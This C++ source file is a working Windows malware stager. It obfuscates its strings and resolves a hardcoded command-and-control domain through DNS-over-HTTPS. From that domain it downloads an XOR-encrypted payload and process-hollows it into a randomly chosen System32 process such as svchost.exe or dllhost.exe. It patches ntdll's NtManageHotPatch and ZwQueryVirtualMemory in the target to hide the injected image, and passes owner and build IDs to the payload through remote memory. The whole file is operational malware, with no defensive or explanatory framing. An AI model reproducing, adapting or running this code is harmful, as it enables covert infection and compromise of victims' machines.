#include <Windows.h> 
#include <utility> 
#include  <Intrin.h>  
#include "Encrypt.h"
#include <wincrypt.h>
#include <string>
#include <vector>
#include <wininet.h>
#include <filesystem>
#include "Shlobj.h"
#include <regex>
#include <fstream>
#include <winternl.h>
#include <codecvt>
#include <cstdlib>
#include <ctime>
#include <random>
#include <chrono>
#include <functional>
#include <array>
#include <sys/stat.h>
#include <direct.h>  // For _mkdir on Windows
#pragma comment(lib, "dxgi.lib")
#include <dxgi.h>
#include <map>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma warning(disable : 4996)

#define DEBUG_MODE 0
int g_x = 0;


typedef NTSTATUS(WINAPI* EMOSS)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG_PTR       ReturnLength
	);

std::vector<uint8_t> bittys;

LPCWSTR GetInjekt() {

	static const std::vector<std::wstring> processNames = {
		EC(L"C:\\Windows\\System32\\dllhost.exe"),
		EC(L"C:\\Windows\\System32\\svchost.exe"),
		EC(L"C:\\Windows\\System32\\DiskSnapshot.exe"),
		EC(L"C:\\Windows\\System32\\fontdrvhost.exe"),
		EC(L"C:\\Windows\\System32\\icacls.exe"),
		EC(L"C:\\Windows\\System32\\IESettingSync.exe"),
		EC(L"C:\\Windows\\System32\\ktmutil.exe"),
		EC(L"C:\\Windows\\System32\\label.exe"),
		EC(L"C:\\Windows\\System32\\LegacyNetUXHost.exe"),
		EC(L"C:\\Windows\\System32\\licensingdiag.exe")
	};

	// Seed the random number generator only once
	static bool initialized = false;
	if (!initialized) {
		std::srand(static_cast<unsigned>(std::time(nullptr)));
		initialized = true;
	}

	// Select a random index
	int randomIndex = std::rand() % processNames.size();

	// Return the randomly selected process name as LPCWSTR
	return processNames[randomIndex].c_str();
}


bool patch_ZwQueryVirtualMemory(HANDLE hProcess, LPVOID module_ptr, HMODULE hNtdll)
{
	if (!hNtdll) return false; // should never happen

	ULONGLONG pos = 8;
	DWORD oldProtect = 0;
	const SIZE_T stub_size = 0x20;

	std::string virtmom = EC("ZwQueryVirtualMemory");

	ULONG_PTR _ZwQueryVirtualMemory = (ULONG_PTR)GetProcAddress(hNtdll, virtmom.c_str());
	if (!_ZwQueryVirtualMemory || _ZwQueryVirtualMemory < pos) {
		return false;
	}
	LPVOID stub_ptr = (LPVOID)((ULONG_PTR)_ZwQueryVirtualMemory - pos);



	if (!VirtualProtectEx(hProcess, stub_ptr, stub_size, PAGE_READWRITE, &oldProtect)) {
		return false;
	}
	LPVOID patch_space = VirtualAllocEx(hProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!patch_space) {
		return false;
	}
	BYTE stub_buffer_orig[stub_size] = { 0 };
	SIZE_T out_bytes = 0;
	if (!ReadProcessMemory(hProcess, stub_ptr, stub_buffer_orig, stub_size, &out_bytes) || out_bytes != stub_size) {
		return false;
	}
	const BYTE nop_pattern[] = { 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00 };
	if (::memcmp(stub_buffer_orig, nop_pattern, sizeof(nop_pattern)) != 0) {
		return false;
	}

	// prepare the patched stub:
	const size_t syscall_pattern_full = 8;
	const size_t syscall_pattern_start = 4;
	const BYTE syscall_fill_pattern[] = {
		0x4C, 0x8B, 0xD1, //mov r10,rcx
		0xB8, 0xFF, 0x00, 0x00, 0x00 // mov eax,[syscall ID]
	};
	if (::memcmp(stub_buffer_orig + pos, syscall_fill_pattern, syscall_pattern_start) != 0) {
		return false;
	}


	// prepare the patch to be applied on ZwQueryVirtualMemory:

	BYTE stub_buffer_patched[stub_size] = { 0 };
	::memcpy(stub_buffer_patched, stub_buffer_orig, stub_size);

	const BYTE jump_back[] = { 0xFF, 0x25, 0xF2, 0xFF, 0xFF, 0xFF };

	::memcpy(stub_buffer_patched, &patch_space, sizeof(LPVOID));
	::memset(stub_buffer_patched + pos, 0x90, syscall_pattern_full);
	::memcpy(stub_buffer_patched + pos, jump_back, sizeof(jump_back));

	// prepare the trampoline:

	const BYTE jump_to_contnue[] = { 0xFF, 0x25, 0xEA, 0xFF, 0xFF, 0xFF };
	ULONG_PTR _ZwQueryVirtualMemory_continue = (ULONG_PTR)_ZwQueryVirtualMemory + syscall_pattern_full;

	BYTE func_patch[] = {
		0x49, 0x83, 0xF8, 0x0E, //cmp r8,0xE -> is MEMORY_INFORMATION_CLASS == MemoryImageExtensionInformation?
		0x75, 0x22, // jne [continue to function]
		0x48, 0x3B, 0x15, 0x0B, 0x00, 0x00, 0x00, // cmp rdx,qword ptr ds:[addr] -> is ImageBase == module_ptr ?
		0x75, 0x19, // jne [continue to function]
		0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -> STATUS_NOT_SUPPORTED
		0xC3 //ret
	};


	BYTE stub_buffer_trampoline[stub_size * 2] = { 0 };
	::memcpy(stub_buffer_trampoline, func_patch, sizeof(func_patch));

	::memcpy(stub_buffer_trampoline + stub_size, stub_buffer_orig, stub_size);
	::memcpy(stub_buffer_trampoline + stub_size - sizeof(LPVOID), &module_ptr, sizeof(LPVOID));
	::memcpy(stub_buffer_trampoline + stub_size, &_ZwQueryVirtualMemory_continue, sizeof(LPVOID));
	::memcpy(stub_buffer_trampoline + stub_size + pos + syscall_pattern_full, jump_to_contnue, sizeof(jump_to_contnue));

	const SIZE_T trampoline_full_size = stub_size + pos + syscall_pattern_full + sizeof(jump_to_contnue);

	if (!WriteProcessMemory(hProcess, stub_ptr, stub_buffer_patched, stub_size, &out_bytes) || out_bytes != stub_size) {
		return false;
	}
	if (!VirtualProtectEx(hProcess, stub_ptr, stub_size, oldProtect, &oldProtect)) {
		return false;
	}
	if (!WriteProcessMemory(hProcess, patch_space, stub_buffer_trampoline, trampoline_full_size, &out_bytes) || out_bytes != trampoline_full_size) {
		return false;
	}



	if (!VirtualProtectEx(hProcess, patch_space, stub_size, PAGE_EXECUTE_READ, &oldProtect)) {
		return false;
	}
	FlushInstructionCache(hProcess, stub_ptr, stub_size);
	return true;

}
DWORD Podyom;


bool patch_NtManageHotPatch64(HANDLE hProcess, HMODULE hNtdll)
{
	if (!hNtdll) return false; // should never happen

	DWORD oldProtect = 0;
	const SIZE_T stub_size = 0x20;

	const BYTE hotpatch_patch[] = {
		0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -> STATUS_NOT_SUPPORTED
		0xC3 //ret
	};


	// syscall stub template
	const size_t syscall_pattern_full = 8;
	const size_t syscall_pattern_start = 4;
	const BYTE syscall_fill_pattern[] = {
		0x4C, 0x8B, 0xD1, //mov r10,rcx
		0xB8, 0xFF, 0x00, 0x00, 0x00 // mov eax,[syscall ID]
	};

	std::string gotpot = EC("NtManageHotPatch");

	ULONG_PTR _NtManageHotPatch = (ULONG_PTR)GetProcAddress(hNtdll, gotpot.c_str());
	if (!_NtManageHotPatch) {
		return false;
	}
	LPVOID stub_ptr = (LPVOID)_NtManageHotPatch;

	if (!VirtualProtectEx(hProcess, stub_ptr, stub_size, PAGE_READWRITE, &oldProtect)) {
		return false;
	}



	BYTE stub_buffer_orig[stub_size] = { 0 };
	SIZE_T out_bytes = 0;
	if (!ReadProcessMemory(hProcess, stub_ptr, stub_buffer_orig, stub_size, &out_bytes) || out_bytes != stub_size) {
		return false;
	}
	// confirm it is a valid syscall stub:
	if (::memcmp(stub_buffer_orig, syscall_fill_pattern, syscall_pattern_start) != 0) {
		return false;
	}



	if (!WriteProcessMemory(hProcess, stub_ptr, hotpatch_patch, sizeof(hotpatch_patch), &out_bytes) || out_bytes != sizeof(hotpatch_patch)) {
		return false;
	}
	if (!VirtualProtectEx(hProcess, stub_ptr, stub_size, oldProtect, &oldProtect)) {
		return false;
	}
	FlushInstructionCache(hProcess, stub_ptr, sizeof(hotpatch_patch));
	return true;
}



int openar() {

	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)bittys.data();
	PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)(bittys.data() + DosHeader->e_lfanew);

	PROCESS_INFORMATION pi;
	STARTUPINFO si = { sizeof(si) };

	ULONG_PTR retlen;
	PROCESS_BASIC_INFORMATION pbi;

	void* newImgBase;
	DWORD64 ImgBaseAddress;

	HMODULE hNtdll = GetModuleHandleA(EC("ntdll"));
	HMODULE ntDll = LoadLibraryA(EC("ntdll.dll"));
	if (ntDll == nullptr) {

#if DEBUG_MODE
		(printf)(EC("Fail Load \n"));
#endif
		return 1;
	}

	std::string nqr = EC("NtQueryInformationProcess");


	EMOSS NtQueryInformationProcess = (EMOSS)GetProcAddress(ntDll, nqr.c_str());


	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		return 1;
	}

	if (!CreateProcess(GetInjekt(),
		NULL, NULL, NULL, FALSE,
		CREATE_SUSPENDED,
		NULL, NULL, &si, &pi)) {

#if DEBUG_MODE
		(printf)(EC("Fail Process \n"));
#endif

		return 1;
	}

	patch_NtManageHotPatch64(pi.hProcess, hNtdll);


	NtQueryInformationProcess(
		pi.hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&retlen
	);



	newImgBase = VirtualAllocEx(
		pi.hProcess,
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);


	Podyom = pi.dwProcessId;



	if (newImgBase == NULL) {

#if DEBUG_MODE
		(printf)(EC("Fail Alloc \n"));
#endif
		return 1;
	}

	WriteProcessMemory(pi.hProcess, newImgBase, bittys.data(), NtHeader->OptionalHeader.SizeOfHeaders, 0);


	PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)(bittys.data() + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

	for (int num = 0; num < NtHeader->FileHeader.NumberOfSections; num++) {
		if (!WriteProcessMemory(pi.hProcess,
			(LPVOID)((DWORD64)newImgBase + SectionHeader->VirtualAddress),
			(LPVOID)((DWORD64)bittys.data() + SectionHeader->PointerToRawData),
			SectionHeader->SizeOfRawData,
			0)) {
#if DEBUG_MODE
			(printf)(EC("Fail Section \n"));
#endif
		}
		SectionHeader++;
	}


	ImgBaseAddress = (DWORD64)pbi.PebBaseAddress + 0x10;
	if (!WriteProcessMemory(pi.hProcess, (LPVOID)ImgBaseAddress, &newImgBase, sizeof(newImgBase), 0)) {
#if DEBUG_MODE
		(printf)(EC("Fail ImgBas \n"));
#endif
	}

	HANDLE NewThread = CreateRemoteThread(pi.hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD64)newImgBase + NtHeader->OptionalHeader.AddressOfEntryPoint),
		NULL,
		CREATE_SUSPENDED,
		NULL);


	if (!NewThread) {
#if DEBUG_MODE
		(printf)(EC("Fail Thrd \n"));
#endif
		return 1;
	}

	SuspendThread(pi.hThread);

	patch_ZwQueryVirtualMemory(pi.hProcess, newImgBase, hNtdll);


	ResumeThread(NewThread);


	/*std::cout << "DosHeader: " << std::hex << "0x" << DosHeader;
	std::cout << "NtHeader: " << std::hex << "0x" << NtHeader;
	std::cout << "Shellcode injected successfully\n";*/

#if DEBUG_MODE
	std::cout << EC("Inj Succes \n") << std::endl;
#endif

	FreeLibrary(ntDll);

	return 0;
}



std::string decrypt(const std::string& encryptedBase64, const std::string& key) {

	std::string decoded;
	std::vector<int> decodingTable(256, -1);
	const std::string base64Chars =
		EC("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");

	for (size_t i = 0; i < base64Chars.size(); i++) {
		decodingTable[base64Chars[i]] = i;
	}

	int val = 0, valb = -8;
	for (unsigned char c : encryptedBase64) {
		if (decodingTable[c] == -1) break;
		val = (val << 6) + decodingTable[c];
		valb += 6;
		if (valb >= 0) {
			decoded.push_back((val >> valb) & 0xFF);
			valb -= 8;
		}
	}

	std::string encryptedData = decoded;


	std::string decrypted;
	size_t keyLength = key.size();
	for (size_t i = 0; i < encryptedData.size(); ++i) {
		decrypted += encryptedData[i] ^ key[i % keyLength];
	}


	return decrypted;
}


static std::map<std::string, std::string> dns_cache;

std::string DownloadStringBetter(const std::string& domain, const std::string& path) {

	static bool init = (WSAStartup(MAKEWORD(2, 2), (WSADATA*)malloc(sizeof(WSADATA))) == 0);

	std::string ip = dns_cache[domain];
	if (ip.empty()) {
#if DEBUG_MODE
		std::cout << EC("[DBG] Resolving ") << domain << EC(" via online API...\n");
#endif

		HINTERNET hi = InternetOpenA(EC("Agents"), 1, 0, 0, 0);
		if (hi) {
			HINTERNET hu = InternetOpenUrlA(hi, (EC("https://dns.google/resolve?name=") + domain + EC("&type=A")).c_str(),
				EC("Accept: application/dns-json\r\n"), -1, 0x84800000, 0);
			if (hu) {
				std::string resp; char buf[1024]; DWORD br;
				while (InternetReadFile(hu, buf, 1024, &br) && br) resp.append(buf, br);
				InternetCloseHandle(hu);

				size_t start = resp.find(EC("\"data\":\""));
				if (start != std::string::npos && (start += 8) < resp.length()) {
					size_t end = resp.find('"', start);
					if (end != std::string::npos) {
						ip = resp.substr(start, end - start);
						if (ip.find('.') != std::string::npos) {
							dns_cache[domain] = ip;
#if DEBUG_MODE
							std::cout << EC("[DBG] Resolved ") << domain << EC(" to ") << ip << EC(" via API\n");
#endif
						}
						else ip.clear();
					}
				}
			}
			InternetCloseHandle(hi);
		}
		if (ip.empty()) return EC("");
	}
	else {
#if DEBUG_MODE
		std::cout << EC("[DBG] Using cached IP for ") << domain << EC(": ") << ip << EC("\n");

#endif
	}

	HINTERNET hi = InternetOpenA(EC("Agent"), 1, 0, 0, 0);
	if (!hi) return EC("");

	std::string url = EC("http://") + ip + path;
	std::string headers = EC("Host: ") + domain + EC("\r\n");
#if DEBUG_MODE
	std::cout << EC("[DBG] Connecting to ") << url << EC("\n");

#endif

	HINTERNET hu = InternetOpenUrlA(hi, url.c_str(), headers.c_str(), -1, 0x84000000, 0);
	if (!hu) {
#if DEBUG_MODE
		std::cout << EC("[DBG] IP connection failed, trying direct domain...\n");

#endif
		hu = InternetOpenUrlA(hi, (EC("http://") + domain + path).c_str(), 0, 0, 0x84000000, 0);
		if (!hu) {
#if DEBUG_MODE
			std::cout << EC("[DBG] All connections failed\n");

#endif
			InternetCloseHandle(hi);
			return EC("");
		}

#if DEBUG_MODE
		std::cout << EC("[DBG] Direct domain connection successful\n");

#endif
	}
	else {

#if DEBUG_MODE
		std::cout << EC("[DBG] Connected via IP\n");

#endif
	}

	std::string result; char buf[4096]; DWORD br, total = 0;

#if DEBUG_MODE
	std::cout << EC("[DBG] Reading response...\n");

#endif
	while (InternetReadFile(hu, buf, 4096, &br) && br) {
		total += br;
		result.append(buf, br);
	}

#if DEBUG_MODE
	std::cout << EC("[DBG] Read ") << total << EC(" bytes total\n");

#endif

	InternetCloseHandle(hu); InternetCloseHandle(hi);
	return result;
}

std::string GRS(size_t length) {
	const std::string charset =
		std::string(EC("abcdefghijklmnopqrstuvwxyz")) +
		std::string(EC("ABCDEFGHIJKLMNOPQRSTUVWXYZ")) +
		std::string(EC("0123456789"));

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dist(0, charset.size() - 1);

	std::string result;
	result.reserve(length);
	for (size_t i = 0; i < length; ++i) {
		result += charset[dist(gen)];
	}
	return result;
}



std::vector<BYTE> Base64ToBytes(const std::string& base64String) {

	DWORD bytesNeeded;
	if (!CryptStringToBinaryA(base64String.c_str(), base64String.length(), CRYPT_STRING_BASE64, NULL, &bytesNeeded, NULL, NULL)) {
		return {};
	}


	std::vector<BYTE> bytes(bytesNeeded);
	if (!CryptStringToBinaryA(base64String.c_str(), base64String.length(), CRYPT_STRING_BASE64, bytes.data(), &bytesNeeded, NULL, NULL)) {
		return {};
	}


	return bytes;
}


std::string SplitAndPick(const std::string& input) {

	std::vector<std::string> substrings;

	std::stringstream ss(input);
	std::string temp;

	while (std::getline(ss, temp, '|')) {
		substrings.push_back(temp);
	}

	if (substrings.empty()) {
		return EC("");
	}

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, substrings.size() - 1);

	return substrings[dis(gen)];
}




struct SharedData {
	DWORD signature;
	volatile bool dataReady;
	char buffer[256];
};

SharedData* findSharedData(HANDLE processHandle) {
	MEMORY_BASIC_INFORMATION mbi;
	uintptr_t address = 0;

	while (VirtualQueryEx(processHandle, (LPCVOID)address, &mbi, sizeof(mbi))) {
		if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE) && mbi.RegionSize >= sizeof(SharedData)) {
			for (uintptr_t pos = (uintptr_t)mbi.BaseAddress; pos <= (uintptr_t)mbi.BaseAddress + mbi.RegionSize - sizeof(SharedData); pos += sizeof(DWORD)) {
				DWORD signature;
				SIZE_T bytesRead;
				if (ReadProcessMemory(processHandle, (LPCVOID)pos, &signature, sizeof(DWORD), &bytesRead) && signature == 0xBA73593C) {
					return (SharedData*)pos;
				}
			}
		}
		address = (uintptr_t)mbi.BaseAddress + mbi.RegionSize;
	}
	return nullptr;
}

void SndMSG(DWORD pid, std::string message)
{
	HANDLE processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!processHandle) {
		std::cerr << EC("Failed to open process!") << std::endl;

	}

	SharedData* remoteData = findSharedData(processHandle);
	if (!remoteData) {
		std::cerr << EC("Could not find receiver memory!") << std::endl;
		CloseHandle(processHandle);

	}

	SIZE_T bytesWritten;

	WriteProcessMemory(processHandle, (LPVOID)&remoteData->buffer, message.c_str(), message.length() + 1, &bytesWritten);

	bool flag = true;
	WriteProcessMemory(processHandle, (LPVOID)&remoteData->dataReady, &flag, sizeof(bool), &bytesWritten);

	std::cout << EC("Message sent!") << std::endl;

	CloseHandle(processHandle);
}


std::string ownrdid = EC("//OWNERID");
std::string bldsid = EC("//BUILDID");

/*
std::string ownrdid = EC("rz6zarjmaf0u9jq4v53hsnz4no61k28");
std::string bldsid = EC("4Suvv0GFZDE3St59PULCW014");
*/


/*
Turn it up, it's your favorite song
Dance, dance, dance to the distortion
Turn it up, keep it on repeat
Stumbling around like a wasted zombie

*/

std::string RandoK;

INT WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{

	/*AllocConsole();
	freopen(EC("CON"), EC("w"), stdout);
	freopen(EC("CON"), EC("w"), stderr);*/

	//(Sleep)(4000);

#if DEBUG_MODE
	(printf)(EC("Beforea All \n"));
#endif

	Sleep(5000);


	HANDLE mutex = CreateMutexA(NULL, TRUE, ((EC("Global\\PFNMX_")) + bldsid).c_str());

#if DEBUG_MODE
	(printf)(EC("Before Mutex 1 \n"));
#endif

	if ((GetLastError)() == ERROR_ALREADY_EXISTS) {
		*(uintptr_t*)0 = 0;

	}
	else
	{


		HANDLE mutexstb = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, ((EC("Global\\PFNX_")) + ownrdid).c_str());

#if DEBUG_MODE
		(printf)(EC("Before Mutex 2 \n"));
#endif

		//(Sleep)(3000);



		if (mutexstb != NULL) {
			CloseHandle(mutexstb);
		}
		else
		{
#if DEBUG_MODE
			(printf)(EC("Before All \n"));
#endif

			//(Sleep)(3000);


			//std::string UrlBlob = decrypt(std::regex_replace(DownloadStringBetter(EC("raw.githubusercontent.com"), EC("/VinieClara/Fortnite-Reverseal-Collection/refs/heads/main/HashNew/NMHash")), std::regex(EC("\\s+")), EC("")), EC("ZwCreateFile"));

			//std::string MainURL = decrypt(SplitAndPick(UrlBlob), EC("ZwCreateFile"));
			std::string MainURL = EC("bounty-valorant.lol");

#if DEBUG_MODE
			std::cout << MainURL << std::endl;
			(printf)(EC("All ok lol \n"));
#endif

			//(Sleep)(3000);
			try
			{
				int retry = 0;
				std::string msgr = ownrdid + EC(":") + bldsid + EC(":") + MainURL;


			A:

				RandoK = GRS(14);


				std::string bobak = decrypt(DownloadStringBetter(MainURL, (EC("/Stb/PokerFace/init.php?id=") + RandoK)), RandoK);

				bittys = Base64ToBytes(bobak);

				std::cout << bittys.size() << std::endl;

				if (8 > bittys.size())
				{
					if (retry > 10)
					{
						*(uintptr_t*)0 = 0;
					}
					else
					{
						retry++;
						(Sleep)(10000);
						goto A;
					}
				}

#if DEBUG_MODE
				(printf)(EC("Install Done going to open \n"));
#endif

				(Sleep)(500);



				(openar)();

#if DEBUG_MODE
				(printf)(EC("Open Done Waiting Transfer \n"));
#endif



				(Sleep)(8000);
				
				SndMSG(Podyom, msgr);

				
				/*


				HANDLE hPipe = CreateFileA(EC("\\\\.\\pipe\\VccFramework"), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);


				DWORD bytesWritten;
				if (!WriteFile(hPipe, msgr.c_str(), strlen(msgr.c_str()), &bytesWritten, NULL)) {
#if DEBUG_MODE
					(printf)(EC("Write Error"));
#endif

					CloseHandle(hPipe);
				}*/



#if DEBUG_MODE
				(printf)(EC("All Enndeddd \n"));
#endif

				(Sleep)(300);
				*(uintptr_t*)0 = 0;

			}
			catch (...) {}

		}


	}
}

